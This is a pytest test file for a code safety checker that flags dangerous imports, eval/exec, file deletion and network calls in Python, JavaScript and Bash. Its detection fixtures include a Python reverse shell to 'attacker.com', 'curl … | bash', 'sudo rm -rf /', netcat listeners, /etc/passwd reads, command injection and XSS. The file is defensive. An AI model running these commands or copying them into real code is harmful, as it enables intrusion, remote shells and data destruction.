"""Unit tests for code safety checker."""

import re

import pytest

from atp.evaluators.security.base import Severity
from atp.evaluators.security.code import (
    CodePattern,
    CodeSafetyChecker,
    Language,
    mask_code_evidence,
)


@pytest.fixture
def checker() -> CodeSafetyChecker:
    """Create CodeSafetyChecker instance."""
    return CodeSafetyChecker()


class TestCodeSafetyCheckerProperties:
    """Tests for CodeSafetyChecker properties."""

    def test_checker_name(self, checker: CodeSafetyChecker) -> None:
        """Test checker name property."""
        assert checker.name == "code_safety"

    def test_checker_check_types(self, checker: CodeSafetyChecker) -> None:
        """Test checker check_types property."""
        types = checker.check_types
        assert "dangerous_import" in types
        assert "dangerous_function" in types
        assert "file_operation" in types
        assert "network_operation" in types


class TestLanguageDetection:
    """Tests for language detection."""

    def test_detect_python(self, checker: CodeSafetyChecker) -> None:
        """Test detecting Python code."""
        code = """
import os
from pathlib import Path

def main():
    print("Hello, world!")

if __name__ == "__main__":
    main()
"""
        lang = checker.detect_language(code)
        assert lang == Language.PYTHON

    def test_detect_javascript(self, checker: CodeSafetyChecker) -> None:
        """Test detecting JavaScript code."""
        code = """
const express = require('express');
const app = express();

function handleRequest(req, res) {
    res.send('Hello, world!');
}

module.exports = app;
"""
        lang = checker.detect_language(code)
        assert lang == Language.JAVASCRIPT

    def test_detect_bash(self, checker: CodeSafetyChecker) -> None:
        """Test detecting Bash code."""
        code = """#!/bin/bash

export PATH="/usr/local/bin:$PATH"

if [[ -f "$1" ]]; then
    echo "File exists"
fi

for file in *.txt; do
    cat "$file"
done
"""
        lang = checker.detect_language(code)
        assert lang == Language.BASH

    def test_detect_unknown(self, checker: CodeSafetyChecker) -> None:
        """Test detecting unknown/ambiguous code."""
        code = "hello world"
        lang = checker.detect_language(code)
        assert lang == Language.UNKNOWN


class TestMaskCodeEvidence:
    """Tests for mask_code_evidence function."""

    def test_mask_short_code(self) -> None:
        """Test masking short code snippet."""
        result = mask_code_evidence("import os")
        assert len(result) <= 80

    def test_mask_long_code(self) -> None:
        """Test masking long code with truncation."""
        long_code = "a" * 100
        result = mask_code_evidence(long_code, max_length=50)
        assert "..." in result

    def test_mask_preserves_visible_chars(self) -> None:
        """Test that masking preserves some visible characters."""
        code = "import subprocess; subprocess.call(['rm', '-rf', '/'])"
        result = mask_code_evidence(code)
        # Should have some visible characters
        assert len([c for c in result if c != "*"]) > 0


class TestPythonDangerousImports:
    """Tests for Python dangerous import detection."""

    def test_detect_import_os(self, checker: CodeSafetyChecker) -> None:
        """Test detecting import os."""
        code = "import os"
        findings = checker.check(code, enabled_types=["dangerous_import"])
        assert len(findings) >= 1
        assert any(f.finding_type == "dangerous_import" for f in findings)
        assert any("os" in f.message for f in findings)

    def test_detect_from_os_import(self, checker: CodeSafetyChecker) -> None:
        """Test detecting from os import."""
        code = "from os import path, getcwd"
        findings = checker.check(code, enabled_types=["dangerous_import"])
        assert len(findings) >= 1
        assert any("os" in f.message for f in findings)

    def test_detect_import_subprocess(self, checker: CodeSafetyChecker) -> None:
        """Test detecting import subprocess (critical)."""
        code = "import subprocess"
        findings = checker.check(code, enabled_types=["dangerous_import"])
        assert len(findings) >= 1
        critical_findings = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(critical_findings) >= 1

    def test_detect_import_socket(self, checker: CodeSafetyChecker) -> None:
        """Test detecting import socket."""
        code = "import socket"
        findings = checker.check(code, enabled_types=["dangerous_import"])
        assert len(findings) >= 1
        assert any("socket" in f.message for f in findings)

    def test_detect_import_pickle(self, checker: CodeSafetyChecker) -> None:
        """Test detecting import pickle."""
        code = "import pickle"
        findings = checker.check(code, enabled_types=["dangerous_import"])
        assert len(findings) >= 1
        assert any("pickle" in f.message for f in findings)

    def test_detect_import_ctypes(self, checker: CodeSafetyChecker) -> None:
        """Test detecting import ctypes (critical)."""
        code = "import ctypes"
        findings = checker.check(code, enabled_types=["dangerous_import"])
        assert len(findings) >= 1
        critical_findings = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(critical_findings) >= 1

    def test_detect_dunder_import(self, checker: CodeSafetyChecker) -> None:
        """Test detecting __import__."""
        code = "__import__('os')"
        findings = checker.check(code, enabled_types=["dangerous_import"])
        assert len(findings) >= 1

    def test_detect_from_shutil_import(self, checker: CodeSafetyChecker) -> None:
        """Test detecting from shutil import."""
        code = "from shutil import rmtree"
        findings = checker.check(code, enabled_types=["dangerous_import"])
        assert len(findings) >= 1
        assert any("shutil" in f.message for f in findings)


class TestPythonDangerousFunctions:
    """Tests for Python dangerous function detection."""

    def test_detect_eval(self, checker: CodeSafetyChecker) -> None:
        """Test detecting eval()."""
        code = "result = eval(user_input)"
        findings = checker.check(code, enabled_types=["dangerous_function"])
        assert len(findings) >= 1
        critical_findings = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(critical_findings) >= 1
        assert any("eval" in f.message for f in findings)

    def test_detect_exec(self, checker: CodeSafetyChecker) -> None:
        """Test detecting exec()."""
        code = "exec(code_string)"
        findings = checker.check(code, enabled_types=["dangerous_function"])
        assert len(findings) >= 1
        critical_findings = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(critical_findings) >= 1

    def test_detect_compile(self, checker: CodeSafetyChecker) -> None:
        """Test detecting compile()."""
        code = "code_obj = compile(source, '<string>', 'exec')"
        findings = checker.check(code, enabled_types=["dangerous_function"])
        assert len(findings) >= 1
        assert any("compile" in f.message for f in findings)

    def test_detect_open(self, checker: CodeSafetyChecker) -> None:
        """Test detecting open()."""
        code = "f = open('/etc/passwd', 'r')"
        findings = checker.check(code, enabled_types=["dangerous_function"])
        assert len(findings) >= 1
        assert any("open" in f.message for f in findings)

    def test_detect_getattr(self, checker: CodeSafetyChecker) -> None:
        """Test detecting getattr()."""
        code = "value = getattr(obj, user_attr)"
        findings = checker.check(code, enabled_types=["dangerous_function"])
        assert len(findings) >= 1

    def test_detect_globals(self, checker: CodeSafetyChecker) -> None:
        """Test detecting globals()."""
        code = "all_globals = globals()"
        findings = checker.check(code, enabled_types=["dangerous_function"])
        assert len(findings) >= 1
        assert any("globals" in f.message for f in findings)


class TestJavaScriptDangerousPatterns:
    """Tests for JavaScript dangerous pattern detection."""

    def test_detect_js_eval(self, checker: CodeSafetyChecker) -> None:
        """Test detecting JavaScript eval()."""
        code = "const result = eval(userCode);"
        findings = checker.check(code, enabled_types=["dangerous_function"])
        assert len(findings) >= 1

    def test_detect_function_constructor(self, checker: CodeSafetyChecker) -> None:
        """Test detecting Function constructor."""
        code = "const fn = new Function('return this');"
        findings = checker.check(code, enabled_types=["dangerous_function"])
        assert len(findings) >= 1

    def test_detect_innerhtml(self, checker: CodeSafetyChecker) -> None:
        """Test detecting innerHTML assignment."""
        code = "element.innerHTML = userContent;"
        findings = checker.check(code, enabled_types=["dangerous_function"])
        assert len(findings) >= 1
        assert any("XSS" in f.message or "innerHTML" in f.message for f in findings)

    def test_detect_document_write(self, checker: CodeSafetyChecker) -> None:
        """Test detecting document.write()."""
        code = "document.write(unsafeContent);"
        findings = checker.check(code, enabled_types=["dangerous_function"])
        assert len(findings) >= 1

    def test_detect_require_fs(self, checker: CodeSafetyChecker) -> None:
        """Test detecting require('fs')."""
        code = "const fs = require('fs');"
        findings = checker.check(code, enabled_types=["dangerous_import"])
        assert len(findings) >= 1

    def test_detect_require_child_process(self, checker: CodeSafetyChecker) -> None:
        """Test detecting require('child_process')."""
        code = "const { exec } = require('child_process');"
        findings = checker.check(code, enabled_types=["dangerous_import"])
        assert len(findings) >= 1
        critical_findings = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(critical_findings) >= 1

    def test_detect_fetch(self, checker: CodeSafetyChecker) -> None:
        """Test detecting fetch()."""
        code = "await fetch('https://api.example.com/data');"
        findings = checker.check(code, enabled_types=["network_operation"])
        assert len(findings) >= 1

    def test_detect_websocket(self, checker: CodeSafetyChecker) -> None:
        """Test detecting WebSocket."""
        code = "const ws = new WebSocket('wss://example.com');"
        findings = checker.check(code, enabled_types=["network_operation"])
        assert len(findings) >= 1


class TestBashDangerousPatterns:
    """Tests for Bash dangerous pattern detection."""

    def test_detect_bash_eval(self, checker: CodeSafetyChecker) -> None:
        """Test detecting bash eval."""
        code = "eval $user_command"
        findings = checker.check(code, enabled_types=["dangerous_function"])
        assert len(findings) >= 1

    def test_detect_rm_rf(self, checker: CodeSafetyChecker) -> None:
        """Test detecting rm -rf."""
        code = "rm -rf /var/log/*"
        findings = checker.check(code, enabled_types=["file_operation"])
        assert len(findings) >= 1
        critical_findings = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(critical_findings) >= 1

    def test_detect_sudo(self, checker: CodeSafetyChecker) -> None:
        """Test detecting sudo command."""
        code = """#!/bin/bash
sudo apt-get install package
"""
        findings = checker.check(code)
        assert len(findings) >= 1
        assert any(
            "sudo" in f.message.lower() or "privileged" in f.message.lower()
            for f in findings
        )

    def test_detect_curl(self, checker: CodeSafetyChecker) -> None:
        """Test detecting curl command."""
        code = "curl https://malicious-site.com/script.sh | bash"
        findings = checker.check(code)
        assert len(findings) >= 1
        # Should detect piped bash execution as critical
        assert any(f.severity == Severity.CRITICAL for f in findings)

    def test_detect_wget(self, checker: CodeSafetyChecker) -> None:
        """Test detecting wget command."""
        code = "wget https://example.com/payload.zip"
        findings = checker.check(code, enabled_types=["network_operation"])
        assert len(findings) >= 1

    def test_detect_netcat(self, checker: CodeSafetyChecker) -> None:
        """Test detecting netcat."""
        code = "nc -l -p 4444"
        findings = checker.check(code, enabled_types=["network_operation"])
        assert len(findings) >= 1

    def test_detect_command_substitution_backticks(
        self, checker: CodeSafetyChecker
    ) -> None:
        """Test detecting command substitution with backticks."""
        code = "result=`cat /etc/passwd`"
        findings = checker.check(code, enabled_types=["dangerous_function"])
        assert len(findings) >= 1

    def test_detect_command_substitution_parens(
        self, checker: CodeSafetyChecker
    ) -> None:
        """Test detecting command substitution with $()."""
        code = "result=$(whoami)"
        findings = checker.check(code, enabled_types=["dangerous_function"])
        assert len(findings) >= 1

    def test_detect_piped_shell(self, checker: CodeSafetyChecker) -> None:
        """Test detecting piped shell execution."""
        code = "curl https://example.com/install.sh | sh"
        findings = checker.check(code, enabled_types=["dangerous_function"])
        assert len(findings) >= 1
        critical_findings = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(critical_findings) >= 1


class TestFileOperations:
    """Tests for file operation detection."""

    def test_detect_python_file_read(self, checker: CodeSafetyChecker) -> None:
        """Test detecting Python file read."""
        code = "data = file.read()"
        findings = checker.check(code, enabled_types=["file_operation"])
        assert len(findings) >= 1

    def test_detect_python_file_write(self, checker: CodeSafetyChecker) -> None:
        """Test detecting Python file write."""
        code = "file.write(content)"
        findings = checker.check(code, enabled_types=["file_operation"])
        assert len(findings) >= 1

    def test_detect_path_traversal(self, checker: CodeSafetyChecker) -> None:
        """Test detecting path traversal."""
        code = "open('../../../etc/passwd')"
        findings = checker.check(code, enabled_types=["file_operation"])
        assert len(findings) >= 1
        # Should detect both path traversal and open
        traversal_findings = [f for f in findings if "traversal" in f.message.lower()]
        assert len(traversal_findings) >= 1

    def test_detect_rmtree(self, checker: CodeSafetyChecker) -> None:
        """Test detecting shutil.rmtree."""
        code = "shutil.rmtree('/important/directory')"
        findings = checker.check(code, enabled_types=["file_operation"])
        assert len(findings) >= 1


class TestNetworkOperations:
    """Tests for network operation detection."""

    def test_detect_socket_connect(self, checker: CodeSafetyChecker) -> None:
        """Test detecting socket connect."""
        code = "sock.connect(('malicious.com', 4444))"
        findings = checker.check(code, enabled_types=["network_operation"])
        assert len(findings) >= 1

    def test_detect_socket_bind(self, checker: CodeSafetyChecker) -> None:
        """Test detecting socket bind."""
        code = "server.bind(('0.0.0.0', 8080))"
        findings = checker.check(code, enabled_types=["network_operation"])
        assert len(findings) >= 1

    def test_detect_requests_get(self, checker: CodeSafetyChecker) -> None:
        """Test detecting requests.get."""
        code = "response = requests.get('https://api.example.com')"
        findings = checker.check(code, enabled_types=["network_operation"])
        assert len(findings) >= 1


class TestCategoryFiltering:
    """Tests for category filtering."""

    def test_filter_dangerous_import_only(self, checker: CodeSafetyChecker) -> None:
        """Test filtering to dangerous_import category only."""
        code = """
import os
eval(user_input)
file.write(data)
socket.connect(addr)
"""
        findings = checker.check(code, enabled_types=["dangerous_import"])
        assert all(f.finding_type == "dangerous_import" for f in findings)

    def test_filter_dangerous_function_only(self, checker: CodeSafetyChecker) -> None:
        """Test filtering to dangerous_function category only."""
        code = """
import os
eval(user_input)
file.write(data)
"""
        findings = checker.check(code, enabled_types=["dangerous_function"])
        assert all(f.finding_type == "dangerous_function" for f in findings)

    def test_filter_file_operation_only(self, checker: CodeSafetyChecker) -> None:
        """Test filtering to file_operation category only."""
        code = """
import os
eval(user_input)
file.write(data)
"""
        findings = checker.check(code, enabled_types=["file_operation"])
        assert all(f.finding_type == "file_operation" for f in findings)

    def test_all_categories(self, checker: CodeSafetyChecker) -> None:
        """Test checking all categories."""
        code = """
import subprocess
eval(user_input)
file.write(data)
sock.connect(addr)
"""
        findings = checker.check(code)
        assert len(findings) >= 3


class TestCustomPatterns:
    """Tests for custom pattern support."""

    def test_custom_pattern(self) -> None:
        """Test adding custom patterns."""
        custom = CodePattern(
            name="custom_danger",
            category="dangerous_function",
            pattern=re.compile(r"dangerous_function\s*\("),
            severity=Severity.CRITICAL,
            description="Custom dangerous function",
            languages=[Language.PYTHON],
        )
        checker = CodeSafetyChecker(custom_patterns=[custom])
        findings = checker.check("dangerous_function()")
        assert len(findings) >= 1
        assert any(f.details["pattern_name"] == "custom_danger" for f in findings)

    def test_add_pattern_method(self, checker: CodeSafetyChecker) -> None:
        """Test add_pattern method."""
        custom = CodePattern(
            name="added_pattern",
            category="dangerous_function",
            pattern=re.compile(r"my_dangerous_call\s*\("),
            severity=Severity.HIGH,
            description="Added dangerous pattern",
            languages=[Language.PYTHON],
        )
        checker.add_pattern(custom)
        findings = checker.check("my_dangerous_call()")
        assert len(findings) >= 1
        assert any(f.details["pattern_name"] == "added_pattern" for f in findings)


class TestIncludeCategories:
    """Tests for include_categories initialization."""

    def test_include_dangerous_import_only(self) -> None:
        """Test initializing with dangerous_import category only."""
        checker = CodeSafetyChecker(include_categories=["dangerous_import"])
        patterns = checker.get_patterns_by_category("dangerous_import")
        assert len(patterns) > 0
        # Should have no dangerous_function patterns
        assert checker.get_patterns_by_category("dangerous_function") == []
        # All patterns should be in the dangerous_import category
        assert all(p.category == "dangerous_import" for p in patterns)

    def test_include_python_only(self) -> None:
        """Test initializing with Python language only."""
        checker = CodeSafetyChecker(include_languages=["python"])
        patterns = checker.get_patterns_by_language("python")
        assert len(patterns) > 0
        # All patterns should include Python
        for pattern in patterns:
            assert Language.PYTHON in pattern.languages


class TestLocationTracking:
    """Tests for location tracking in findings."""

    def test_location_in_findings(self, checker: CodeSafetyChecker) -> None:
        """Test that location is included in findings."""
        code = "import os"
        findings = checker.check(code, location="script.py")
        assert len(findings) >= 1
        assert findings[0].location == "script.py"

    def test_none_location(self, checker: CodeSafetyChecker) -> None:
        """Test findings without location."""
        code = "import os"
        findings = checker.check(code)
        assert len(findings) >= 1
        assert findings[0].location is None


class TestDuplicateDetection:
    """Tests for duplicate detection handling."""

    def test_no_duplicate_findings(self, checker: CodeSafetyChecker) -> None:
        """Test that the same pattern isn't reported twice."""
        code = "import os\nimport os"
        findings = checker.check(code, enabled_types=["dangerous_import"])
        # Should only report once per pattern name
        pattern_names = [f.details["pattern_name"] for f in findings]
        os_patterns = [p for p in pattern_names if "os" in p]
        # Should only have one finding for os import
        assert len(os_patterns) <= 1


class TestFindingDetails:
    """Tests for finding details."""

    def test_remediation_in_details(self, checker: CodeSafetyChecker) -> None:
        """Test that remediation is included in details."""
        code = "import os"
        findings = checker.check(code, enabled_types=["dangerous_import"])
        assert len(findings) >= 1
        assert "remediation" in findings[0].details

    def test_line_number_in_details(self, checker: CodeSafetyChecker) -> None:
        """Test that line number is included in details."""
        code = "# comment\nimport os"
        findings = checker.check(code, enabled_types=["dangerous_import"])
        assert len(findings) >= 1
        assert "line_number" in findings[0].details
        assert findings[0].details["line_number"] == 2

    def test_language_in_details(self, checker: CodeSafetyChecker) -> None:
        """Test that detected language is included in details."""
        code = "import os\ndef main():\n    pass"
        findings = checker.check(code, enabled_types=["dangerous_import"])
        assert len(findings) >= 1
        assert "language" in findings[0].details
        assert findings[0].details["language"] == "python"


class TestSafeCode:
    """Tests for code without dangerous patterns."""

    def test_safe_python(self, checker: CodeSafetyChecker) -> None:
        """Test that safe Python code returns minimal/no findings."""
        code = """
def add(a, b):
    return a + b

class Calculator:
    def multiply(self, x, y):
        return x * y
"""
        findings = checker.check(code)
        # Should have no high/critical severity findings
        high_severity = [f for f in findings if f.severity >= Severity.HIGH]
        assert len(high_severity) == 0

    def test_safe_javascript(self, checker: CodeSafetyChecker) -> None:
        """Test that safe JavaScript code returns minimal/no findings."""
        code = """
function add(a, b) {
    return a + b;
}

const multiply = (x, y) => x * y;
"""
        findings = checker.check(code)
        # Should have no critical findings
        critical = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(critical) == 0


class TestUnsafeCodeExamples:
    """Tests with realistic unsafe code examples."""

    def test_reverse_shell_python(self, checker: CodeSafetyChecker) -> None:
        """Test detecting reverse shell pattern in Python."""
        code = """
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("attacker.com", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
"""
        findings = checker.check(code)
        assert len(findings) >= 3
        critical_findings = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(critical_findings) >= 1

    def test_command_injection_python(self, checker: CodeSafetyChecker) -> None:
        """Test detecting command injection in Python."""
        code = """
import os
user_input = input("Enter filename: ")
os.system(f"cat {user_input}")
"""
        findings = checker.check(code)
        assert len(findings) >= 1
        assert any("os" in f.message for f in findings)

    def test_file_deletion_bash(self, checker: CodeSafetyChecker) -> None:
        """Test detecting dangerous file deletion in Bash."""
        code = """#!/bin/bash
sudo rm -rf /
"""
        findings = checker.check(code)
        assert len(findings) >= 1
        critical_findings = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(critical_findings) >= 1

    def test_xss_vulnerability_js(self, checker: CodeSafetyChecker) -> None:
        """Test detecting XSS vulnerability in JavaScript."""
        code = """
const userInput = document.getElementById('input').value;
document.getElementById('output').innerHTML = userInput;
"""
        findings = checker.check(code)
        assert len(findings) >= 1
        assert any("XSS" in f.message or "innerHTML" in f.message for f in findings)

    def test_arbitrary_code_execution(self, checker: CodeSafetyChecker) -> None:
        """Test detecting arbitrary code execution patterns."""
        code = """
user_code = request.get('code')
exec(compile(user_code, '<string>', 'exec'))
"""
        findings = checker.check(code)
        assert len(findings) >= 2
        critical_findings = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(critical_findings) >= 1


class TestGetPatternsMethods:
    """Tests for get_patterns_by_* methods."""

    def test_get_patterns_by_category(self, checker: CodeSafetyChecker) -> None:
        """Test get_patterns_by_category method."""
        import_patterns = checker.get_patterns_by_category("dangerous_import")
        func_patterns = checker.get_patterns_by_category("dangerous_function")
        file_patterns = checker.get_patterns_by_category("file_operation")
        network_patterns = checker.get_patterns_by_category("network_operation")

        assert len(import_patterns) > 0
        assert len(func_patterns) > 0
        assert len(file_patterns) > 0
        assert len(network_patterns) > 0

    def test_get_patterns_by_language(self, checker: CodeSafetyChecker) -> None:
        """Test get_patterns_by_language method."""
        python_patterns = checker.get_patterns_by_language("python")
        js_patterns = checker.get_patterns_by_language("javascript")
        bash_patterns = checker.get_patterns_by_language("bash")

        assert len(python_patterns) > 0
        assert len(js_patterns) > 0
        assert len(bash_patterns) > 0

    def test_get_patterns_invalid_language(self, checker: CodeSafetyChecker) -> None:
        """Test get_patterns_by_language with invalid language."""
        patterns = checker.get_patterns_by_language("invalid_lang")
        assert patterns == []
